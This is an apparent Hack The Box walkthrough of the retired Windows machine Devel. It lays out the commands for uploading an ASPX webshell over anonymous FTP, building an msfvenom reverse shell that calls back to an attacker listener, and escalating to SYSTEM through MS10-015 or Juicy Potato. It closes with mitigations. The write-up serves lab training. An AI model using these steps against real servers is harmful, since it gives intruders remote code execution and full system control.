---
machine: Devel
os: Windows
difficulty: Easy
platform: Hack The Box
category: Windows / Web
state: Retired
tags: [windows, ftp, iis, aspx, webshell, seimpersonate, ms10-015, privesc]
---

# Devel — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Only two ports: Microsoft FTP with anonymous login **and write access**, plus IIS 7.5 serving that exact folder. Upload an `.aspx` over FTP, request it over HTTP, and you execute as `iis apppool\web`. Unpatched, escalation is a kernel exploit (MS10-015 / KiTrap0D) or, if the token allows it, `SeImpersonate`.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
21/tcp open  ftp   Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  <DIR> aspnet_client
| 03-17-17   689  iisstart.htm
|_03-17-17  184946 welcome.png
80/tcp open  http  Microsoft IIS httpd 7.5
|_http-title: IIS7
```

The hint is in the listing: `iisstart.htm` and `welcome.png` are IIS defaults, so the FTP **is** `wwwroot`.

```bash
ftp <IP>
# Name: anonymous
# Password: (empty)
ftp> put cmdasp.aspx
ftp> ls
```

## Access

Command webshell and identity check:

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp> put cmdasp.aspx
curl -s "http://<IP>/cmdasp.aspx?cmd=whoami"
# iis apppool\web
```

For a comfortable shell, an ASPX reverse shell plus a handler:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0> LPORT=4444 -f aspx -o shell.aspx
ftp> binary
ftp> put shell.aspx
curl -s http://<IP>/shell.aspx
```

```bash
rlwrap nc -lvnp 4444
```

If the session dies when you send a command (common with `shell_reverse_tcp` on this IIS), upload `nc.exe` and launch it from `cmdasp.aspx`, or use the Antak webshell.

## Escalation

Minimal collection:

```cmd
whoami /priv
systeminfo
wmic qfe list brief
```

It is an unpatched Windows 7 x86 (`6.1 Build 7600`, no hotfixes). Two paths:

- **Kernel**: MS10-015 / CVE-2010-0232 (`KiTrap0D`), x86 only. Upload/compile the exploit and run it to get `NT AUTHORITY\SYSTEM`.
- **Token**: if `whoami /priv` shows `SeImpersonatePrivilege`, `MS16-075` (Juicy Potato / Rotten Potato) works just as well.

```cmd
whoami
# nt authority\system
type C:\Users\Administrator\Desktop\root.txt
```

## Pitfalls

- Meterpreter hangs on this host; a `shell_reverse_tcp` payload or `nc.exe` is steadier.
- Run `ftp> binary` **before** `put` for binaries, or the executable arrives corrupted.
- MS10-015 needs x86; it does not apply on x64.
- Meterpreter's `sysinfo` confirms version and architecture before picking an exploit.

## Lessons

- Anonymous FTP with write access to the webroot is RCE without an exploit: it is configuration.
- An unpatched server turns a low-privilege foothold into SYSTEM.
- Mitigation: no write access and no webroot behind FTP, anonymous accounts disabled, patching, and `SeImpersonate` removed where unnecessary.
